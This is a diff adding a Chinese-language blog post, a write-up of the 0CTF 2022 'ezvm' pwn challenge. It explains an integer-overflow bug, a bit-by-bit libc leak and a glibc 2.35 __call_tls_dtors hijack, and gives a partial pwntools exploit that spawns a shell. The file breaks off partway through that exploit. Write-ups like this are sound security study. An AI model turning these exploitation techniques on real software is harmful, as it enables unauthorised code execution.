@@ -1,0 +1,484 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="ezvm总结照着Water Paddler队的wp复现的，不得不说外国师傅写wp都挺详细的，都落在重点上。这题我自己大概复现了两天左右，感觉是道很不错的题目 首先总结一下从中学到的知识点：  这题中用来泄漏libc的方式有点侧信道攻击的feel，利用运算结果的不同分别设置了两种跳转，对应着程序不同的输出结果，这样就可以通过程序的输出来判断当前泄漏的bit是多少  这题的漏洞为一个整数溢出导致的si">
+<meta property="og:type" content="article">
+<meta property="og:title" content="0ctf-2022">
+<meta property="og:url" content="https://github.com/CharonPt/CharonPt.github.io.git/2022/09/22/0ctf-2022/index.html">
+<meta property="og:site_name" content="CharonPt的Blog">
+<meta property="og:description" content="ezvm总结照着Water Paddler队的wp复现的，不得不说外国师傅写wp都挺详细的，都落在重点上。这题我自己大概复现了两天左右，感觉是道很不错的题目 首先总结一下从中学到的知识点：  这题中用来泄漏libc的方式有点侧信道攻击的feel，利用运算结果的不同分别设置了两种跳转，对应着程序不同的输出结果，这样就可以通过程序的输出来判断当前泄漏的bit是多少  这题的漏洞为一个整数溢出导致的si">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://github.com/2022/09/22/0ctf-2022/%E9%A2%98%E7%9B%AE-1.jpg">
+<meta property="og:image" content="https://github.com/2022/09/22/0ctf-2022/%E9%A2%98%E7%9B%AE-2.jpg">
+<meta property="og:image" content="https://github.com/2022/09/22/0ctf-2022/%E9%A2%98%E7%9B%AE-3.jpg">
+<meta property="og:image" content="https://github.com/2022/09/22/0ctf-2022/%E9%A2%98%E7%9B%AE-4.jpg">
+<meta property="og:image" content="https://github.com/2022/09/22/0ctf-2022/%E9%A2%98%E7%9B%AE-5.jpg">
+<meta property="og:image" content="https://github.com/2022/09/22/0ctf-2022/%E9%A2%98%E7%9B%AE-6.jpg">
+<meta property="og:image" content="https://github.com/2022/09/22/0ctf-2022/%E9%A2%98%E7%9B%AE-7.jpg">
+<meta property="og:image" content="https://github.com/2022/09/22/0ctf-2022/call_tls_dtors-1.jpg">
+<meta property="article:published_time" content="2022-09-22T03:18:24.000Z">
+<meta property="article:modified_time" content="2022-09-24T13:03:51.131Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="0ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/2022/09/22/0ctf-2022/%E9%A2%98%E7%9B%AE-1.jpg">
+
+<link rel="canonical" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/09/22/0ctf-2022/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>0ctf-2022 | CharonPt的Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">CharonPt的Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/09/22/0ctf-2022/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CharonPt的Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          0ctf-2022
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-09-22 11:18:24" itemprop="dateCreated datePublished" datetime="2022-09-22T11:18:24+08:00">2022-09-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-09-24 21:03:51" itemprop="dateModified" datetime="2022-09-24T21:03:51+08:00">2022-09-24</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="ezvm"><a href="#ezvm" class="headerlink" title="ezvm"></a>ezvm</h2><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>照着<a target="_blank" rel="noopener" href="https://ctftime.org/writeup/35596">Water Paddler队的wp</a>复现的，不得不说外国师傅写wp都挺详细的，都落在重点上。这题我自己大概复现了两天左右，感觉是道很不错的题目</p>
+<p>首先总结一下从中学到的知识点：</p>
+<ol>
+<li><p>这题中用来泄漏libc的方式有点侧信道攻击的feel，利用运算结果的不同分别设置了两种跳转，对应着程序不同的输出结果，这样就可以通过程序的输出来判断当前泄漏的bit是多少</p>
+</li>
+<li><p>这题的漏洞为一个整数溢出导致的size跟实际malloc的size不同，从而获得了任意libc写，所以平时做题时可以重点关注有没有malloc的size跟输入的size有出入的情况，可能洞就在这里。</p>
+</li>
+<li><p>get了一条在2.35下可用的任意函数执行的新链（<code>___call_tls_dtors</code>）</p>
+<p>利用条件总结一下就是：① 有libc(vmmap)地址，有libc(vmmap)任意地址写。② 能显式或者隐式调用<code>exit</code>。</p>
+<p>这条链的优点大概就是很容易构造，只需要修改很少的地方就可以做到任意函数执行且控制rdi。</p>
+<p>利用方式：①在<code>fs:[-0x58]</code>这个位置布置一个指针。②将<code>fs:[0x30]</code>这个点盖成0。③将要调用的函数地址<code>rol 0x11</code>之后写到①指针指向的地址。④在①指针指向的地址+8处布置参数地址。⑤调用<code>exit</code></p>
+</li>
+</ol>
+<p>详细的跟着题目一起讲</p>
+<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>版本glibc-2.35，保护全开，没有沙箱</p>
+<p>main函数</p>
+<img src="/2022/09/22/0ctf-2022/%E9%A2%98%E7%9B%AE-1.jpg" class>
+
+<p>无限次数执行直到输入<code>bye bye\x00</code></p>
+<p>跟到<code>run_vm</code>函数</p>
+<img src="/2022/09/22/0ctf-2022/%E9%A2%98%E7%9B%AE-2.jpg" class>
+
+<p>首先要求输入<code>Code</code>的size，程序跟着malloc对应大小来用作<code>Code</code>空间</p>
+<p>接着要求输入<code>memory count</code>，程序会将<code>count * 8</code>作为malloc的大小申请空间保存<code>Data</code>，这里就存在一个整数溢出，导致count可以远大于malloc的大小，例如<code>0x2000000000000000 * 8 == 0</code>，其高位会被置零，另外只允许一次输入的count大于<code>0x1FFFFFFFFFFFFFFLL</code>。</p>
+<p>接下来是<code>initvm()</code>，里面将前面malloc的chunk的指针放到数据段上，然后<code>malloc(0x800);</code>用来作为栈空间（结合后面执行指令的函数知道的）</p>
+<img src="/2022/09/22/0ctf-2022/%E9%A2%98%E7%9B%AE-3.jpg" class>
+
+<p>然后就是执行指令的函数<code>execve_vm</code>，这部分就是正常的vm指令逆向，这题的指令集逆向并不是很困难，各部分指令的快速解释如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">0 -&gt; push r0-3 on stack</span><br><span class="line">1 -&gt; pop from stack (to r0-r3)</span><br><span class="line">2 -&gt; add</span><br><span class="line">3 -&gt; sub</span><br><span class="line">4 -&gt; multiply</span><br><span class="line">5 -&gt; divide</span><br><span class="line">6 -&gt; modulo</span><br><span class="line">7 -&gt; shl</span><br><span class="line">8 -&gt; shr</span><br><span class="line">9 -&gt; and</span><br><span class="line">10 -&gt; well no 10 , because 10 is carriage return , and ends code input :)</span><br><span class="line">11 -&gt; or</span><br><span class="line">12 -&gt; xor</span><br><span class="line">13 -&gt; test</span><br><span class="line">14 -&gt; jmp offset</span><br><span class="line">15 -&gt; jmpne offset  ,jump if actual stack value != 0,  and pop value</span><br><span class="line">16 -&gt; jmpe offset   ,jump if actual stack value == 0,  and pop value</span><br><span class="line">17 -&gt; compare two stacks entries, pop them, push 1 if equals</span><br><span class="line">18 -&gt; compare two stacks entries, pop them, push 1 if lower</span><br><span class="line">19 -&gt; compare two stacks entries, pop them, push 1 if higher</span><br><span class="line">20 -&gt; set 64bit value of internal reg r0-3</span><br><span class="line">21 -&gt; write r0-r3 to offset in data memory (oob is here)</span><br><span class="line">22 -&gt; read data memory value at offset, in internal register r0-3 (no oob in this one)</span><br><span class="line">23 -&gt; exit opcode</span><br></pre></td></tr></table></figure>
+
+<p>这部分的具体逆向就不写了，比较简单，这里只具体说一下各部分的思路：</p>
+<h4 id="1-泄漏libc"><a href="#1-泄漏libc" class="headerlink" title="1.泄漏libc"></a>1.泄漏libc</h4><p>逆向完全部指令集之后可以发现并没有能够给我们输出程序相关信息的指令，当对应的指令不存在时程序会打印一个<code>what???</code></p>
+<img src="/2022/09/22/0ctf-2022/%E9%A2%98%E7%9B%AE-4.jpg" class>
+
+<p>而这题就需要利用这个点，首先关注到15、16对应的指令相当于根据栈顶是否空来决定是否进行跳转，如下：</p>
+<img src="/2022/09/22/0ctf-2022/%E9%A2%98%E7%9B%AE-5.jpg" class>
+
+<p>另外程序中还有能将栈顶两个元素按位或的指令</p>
+<img src="/2022/09/22/0ctf-2022/%E9%A2%98%E7%9B%AE-6.jpg" class>
+
+<p>所以我们就可以让1跟那个要被我们泄漏的地址的每一位进行按位或，这样栈顶元素就一定是0/1，这样15/16指令就会根据按位或的结果产生不同的跳转，让这个不同的跳转分别对应两种不同的程序输出（例如让某种情况跳转到一个不存在的指令集，那么这种情况对应的就是程序输出了<code>what???</code>，而另一种情况跳转到正常退出的指令，那么程序就不会输出<code>what???</code>，我们就可以根据程序的输出来确定按位或的结果，从而泄漏出每一个bit）</p>
+<p>在此前有一个问题就是怎么获得一个libc的地址在vm模拟的<code>Stack</code>空间里，思路如下：</p>
+<p>首先是run_vm中的malloc流程：</p>
+<ol>
+<li>malloc Code空间</li>
+<li>malloc Data空间</li>
+<li>进入初始化vm的函数时固定<code>malloc(0x800);</code>作为栈空间</li>
+</ol>
+<p>执行完Code之后的free流程：<code>free Data -&gt; free Code -&gt; free Stack</code></p>
+<p>如果第一轮malloc一个tcache size给Code，malloc一个unsorted bin size给Data，那么在最后free走的时候Data跟Stack的chunk会合并，第二轮拿回Data的时候就会留一个main_arena（或者说两个）</p>
+<h4 id="2-任意libc地址写"><a href="#2-任意libc地址写" class="headerlink" title="2.任意libc地址写"></a>2.任意libc地址写</h4><p>在前面已经说过了程序在申请Code空间时存在整数溢出，而这个点可以利用在21这个指令集里</p>
+<img src="/2022/09/22/0ctf-2022/%E9%A2%98%E7%9B%AE-7.jpg" class>
+
+<p>很简单，就是把一个模拟的寄存器的值写到以Data为基址的任意偏移处，让这个偏移几乎无限大的时候就是任意libc地址写了。</p>
+<h4 id="3-指令执行"><a href="#3-指令执行" class="headerlink" title="3.指令执行"></a>3.指令执行</h4><p>当程序调用<code>exit</code>时存在这样的调用链：<code>exit() -&gt; __run_exit_handlers() -&gt; __call_tls_dtors()</code></p>
+<p>其中<code>__call_tls_dtors</code>函数用来解析<code>dtors</code>表，首先dtors table是个单链表，其结构如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    dtor_func func;		<span class="comment">//8 bit</span></span><br><span class="line">    <span class="keyword">void</span> *obj;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">map</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>该单链表会被<code>__call_tls_dtors()</code>逐个解析，调用其中的<code>dtor_func func</code>并且以<code>void *obj;</code>作为参数，但是这个函数调用<code>dtor_func func</code>的方式有点奇怪，具体的结合着汇编来看。</p>
+<p>该函数的具体汇编如下：</p>
+<img src="/2022/09/22/0ctf-2022/call_tls_dtors-1.jpg" class>
+
+<p>稍微说一下汇编逻辑，其首先其会检查<code>tls-storage</code>区域(<code>fs:[-0x58]</code>)是否存在dtors表（存放dtors表的指针，并不是dtors表本身在这个位置）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7ffff7dc7d6a</span> &lt;__GI___call_tls_dtors+<span class="number">10</span>&gt;:	mov    rbx,QWORD PTR [rip+<span class="number">0x1d301f</span>]        # <span class="number">0x7ffff7f9ad90</span></span><br><span class="line"><span class="number">0x7ffff7dc7d71</span> &lt;__GI___call_tls_dtors+<span class="number">17</span>&gt;:	mov    rbp,QWORD PTR fs:[rbx]</span><br><span class="line"><span class="number">0x7ffff7dc7d75</span> &lt;__GI___call_tls_dtors+<span class="number">21</span>&gt;:	test   rbp,rbp</span><br></pre></td></tr></table></figure>
+
+<p>如果不存在就准备返回</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7ffff7dc7d78</span> &lt;__GI___call_tls_dtors+<span class="number">24</span>&gt;:	je     <span class="number">0x7ffff7dc7dbd</span> &lt;__GI___call_tls_dtors+<span class="number">93</span>&gt;</span><br><span class="line">......</span><br><span class="line"><span class="number">0x7ffff7dc7dbd</span> &lt;__GI___call_tls_dtors+<span class="number">93</span>&gt;:	add    rsp,<span class="number">0x8</span></span><br><span class="line"><span class="number">0x7ffff7dc7dc1</span> &lt;__GI___call_tls_dtors+<span class="number">97</span>&gt;:	pop    rbx</span><br><span class="line"><span class="number">0x7ffff7dc7dc2</span> &lt;__GI___call_tls_dtors+<span class="number">98</span>&gt;:	pop    rbp</span><br><span class="line"><span class="number">0x7ffff7dc7dc3</span> &lt;__GI___call_tls_dtors+<span class="number">99</span>&gt;:	ret    </span><br></pre></td></tr></table></figure>
+
+<p>如果存在则一个个遍历，并且调用每个dtors table中的<code>dtor_func func;</code>，以<code>void *obj;</code>作为第一个参数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7ffff7dc7d7a</span> &lt;__GI___call_tls_dtors+<span class="number">26</span>&gt;:	nop    WORD PTR [rax+rax*<span class="number">1</span>+<span class="number">0x0</span>]</span><br><span class="line"><span class="number">0x7ffff7dc7d80</span> &lt;__GI___call_tls_dtors+<span class="number">32</span>&gt;:	mov    rdx,QWORD PTR [rbp+<span class="number">0x18</span>]		<span class="meta"># struct dtor_list *next;</span></span><br><span class="line"><span class="number">0x7ffff7dc7d84</span> &lt;__GI___call_tls_dtors+<span class="number">36</span>&gt;:	mov    rax,QWORD PTR [rbp+<span class="number">0x0</span>]		# dtor_func func;</span><br><span class="line"><span class="number">0x7ffff7dc7d88</span> &lt;__GI___call_tls_dtors+<span class="number">40</span>&gt;:	ror    rax,<span class="number">0x11</span>						# 这里会把func ror <span class="number">0x11</span>位</span><br><span class="line"><span class="number">0x7ffff7dc7d8c</span> &lt;__GI___call_tls_dtors+<span class="number">44</span>&gt;:	<span class="keyword">xor</span>    rax,QWORD PTR fs:<span class="number">0x30</span>		# 然后跟fs:[<span class="number">0x30</span>]异或一次</span><br><span class="line"><span class="number">0x7ffff7dc7d95</span> &lt;__GI___call_tls_dtors+<span class="number">53</span>&gt;:	mov    QWORD PTR fs:[rbx],rdx		# 将next指针写到fs:[<span class="number">-0x58</span>]</span><br><span class="line"><span class="number">0x7ffff7dc7d99</span> &lt;__GI___call_tls_dtors+<span class="number">57</span>&gt;:	mov    rdi,QWORD PTR [rbp+<span class="number">0x8</span>]		<span class="meta"># void *obj;</span></span><br><span class="line"><span class="number">0x7ffff7dc7d9d</span> &lt;__GI___call_tls_dtors+<span class="number">61</span>&gt;:	call   rax							<span class="meta"># func(*obj);</span></span><br><span class="line"><span class="number">0x7ffff7dc7d9f</span> &lt;__GI___call_tls_dtors+<span class="number">63</span>&gt;:	mov    rax,QWORD PTR [rbp+<span class="number">0x10</span>]</span><br><span class="line"><span class="number">0x7ffff7dc7da3</span> &lt;__GI___call_tls_dtors+<span class="number">67</span>&gt;:	lock sub QWORD PTR [rax+<span class="number">0x468</span>],<span class="number">0x1</span></span><br><span class="line"><span class="number">0x7ffff7dc7dac</span> &lt;__GI___call_tls_dtors+<span class="number">76</span>&gt;:	mov    rdi,rbp</span><br><span class="line"><span class="number">0x7ffff7dc7daf</span> &lt;__GI___call_tls_dtors+<span class="number">79</span>&gt;:	call   <span class="number">0x7ffff7daa370</span> &lt;<span class="built_in">free</span>@plt&gt;</span><br><span class="line"><span class="number">0x7ffff7dc7db4</span> &lt;__GI___call_tls_dtors+<span class="number">84</span>&gt;:	mov    rbp,QWORD PTR fs:[rbx]</span><br><span class="line"><span class="number">0x7ffff7dc7db8</span> &lt;__GI___call_tls_dtors+<span class="number">88</span>&gt;:	test   rbp,rbp						# 判断是否有下一个dtors表</span><br><span class="line"><span class="number">0x7ffff7dc7dbb</span> &lt;__GI___call_tls_dtors+<span class="number">91</span>&gt;:	jne    <span class="number">0x7ffff7dc7d80</span> &lt;__GI___call_tls_dtors+<span class="number">32</span>&gt;	#如果有就重复执行</span><br></pre></td></tr></table></figure>
+
+<p>可以看到在正常情况下该函数取完<code>dtor_func func;</code>之后会先<code>ror 0x11</code>，然后再跟<code>fs:0x30</code>这个点异或一次（fs:0x30就是跟canary有关的那个随机数），接下来再正常取参数然后调用。</p>
+<p>所以我们想要做到任意函数调用的话首先需要把<code>fs:0x30</code>这个随机值给盖掉，然后把函数地址<code>rol 0x11</code>之后写到<code>dtor_func func;</code>里。</p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./ezvm&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.35.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;code size&quot;</span>,<span class="built_in">str</span>(<span class="number">0x100</span>)) <span class="comment">#code</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;memory count:&quot;</span>,<span class="built_in">str</span>(<span class="number">0x100</span>)) <span class="comment">#count =&gt; Data = 8*0x100</span></span><br><span class="line">code = <span class="string">&#x27;\x17&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input your code:&quot;</span>,code)</span><br><span class="line"></span><br><span class="line"><span class="comment"># mov reg[0],Data[0]</span></span><br><span class="line"><span class="comment"># mov reg[1],p64(1&lt;&lt;i)</span></span><br><span class="line"><span class="comment"># push reg[0]</span></span><br><span class="line"><span class="comment"># push reg[1]</span></span><br><span class="line"><span class="comment"># and :reg[0] &amp;= reg[1]</span></span><br><span class="line"><span class="comment"># jmp if stack[sp] not zero</span></span><br><span class="line"></span><br><span class="line">leak = <span class="number">0</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;continue?\n&quot;</span>,<span class="string">&#x27;continue&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">41</span>,<span class="number">1</span>):</span><br><span class="line">	code = <span class="string">&#x27;\x16\x00&#x27;</span>+p64(<span class="number">0</span>) <span class="comment">#mov reg[0],Data[0]</span></span><br><span class="line">	code += <span class="string">&#x27;\x14\x01&#x27;</span>+p64(<span class="number">1</span>&lt;&lt;i) <span class="comment">#mov reg[1],p64(1&lt;&lt;i)</span></span><br><span class="line">	code += <span class="string">&#x27;\x00\x00&#x27;</span> <span class="comment"># push reg[0]</span></span><br><span class="line">	code += <span class="string">&#x27;\x00\x01&#x27;</span> <span class="comment"># push reg[1]</span></span><br><span class="line">	code += <span class="string">&#x27;\x09&#x27;</span> <span class="comment"># and :reg[0] &amp;= reg[1]</span></span><br><span class="line">	code += <span class="string">&#x27;\x0f&#x27;</span>+p64(<span class="number">1</span>) <span class="comment"># if 0:jmp 0x18,if 1:jmp 0x17</span></span><br><span class="line">	code += <span class="string">&#x27;\x18\x17&#x27;</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;code size:\n&quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(code))) <span class="comment">#code</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;memory count:&quot;</span>,<span class="built_in">str</span>(<span class="number">0x100</span>)) <span class="comment">#count =&gt; Data = 8*0x100</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Please input your code:&quot;</span>,code)</span><br><span class="line">	a = p.recvuntil(<span class="string">&quot;finish!\n&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">b&#x27;what???&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> a:</span><br><span class="line">		leak |= <span class="number">1</span>&lt;&lt;i</span><br><span class="line">leak |= <span class="number">0x7f0000000000</span></span><br><span class="line">libc_base = leak - (<span class="number">0x7ffb052bbce0</span> - <span class="number">0x7ffb050a2000</span>)</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line">fsbase = libc_base + (<span class="number">0x7ffb0509f740</span> - <span class="number">0x7ffb050a2000</span>)</span><br><span class="line">vmmap = libc_base + (<span class="number">0x7f51e7701010</span> - <span class="number">0x7f51e7885000</span>)</span><br><span class="line"><span class="comment"># fs:[-0x58] = system</span></span><br><span class="line"><span class="comment"># fs:[-0x58] + 8 = binsh</span></span><br><span class="line"><span class="comment"># fs:0x30 = 0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rol</span>(<span class="params">num,shift</span>):</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(shift):</span><br><span class="line">		num=(num&lt;&lt;<span class="number">0x1</span>)&amp;<span class="number">0xFFFFFFFFFFFFFFFF</span>+(num&amp;<span class="number">0x8000000000000000</span>)</span><br><span class="line">	<span class="keyword">return</span> num</span><br><span class="line">code = <span class="string">&#x27;\x14\x03&#x27;</span>+p64(rol(system,<span class="number">0x11</span>))</span><br><span class="line">code += <span class="string">&#x27;\x14\x02&#x27;</span>+p64(binsh)</span><br><span class="line">code += <span class="string">&#x27;\x14\x01&#x27;</span>+p64(vmmap+<span class="number">0x181000</span>)</span><br><span class="line">code += <span class="string">&#x27;\x14\x00&#x27;</span>+p64(<span class="number">0</span>)</span><br><span class="line">offset = (fsbase-<span class="number">0x58</span>-vmmap)/<span class="number">8</span></span><br><span class="line">code += <span class="string">&#x27;\x15\x01&#x27;</span>+p64(offset) <span class="comment"># fs:[-0x58] point to vmmap+0x600</span></span><br><span class="line">code += <span class="string">&#x27;\x15\x03&#x27;</span>+p64(<span 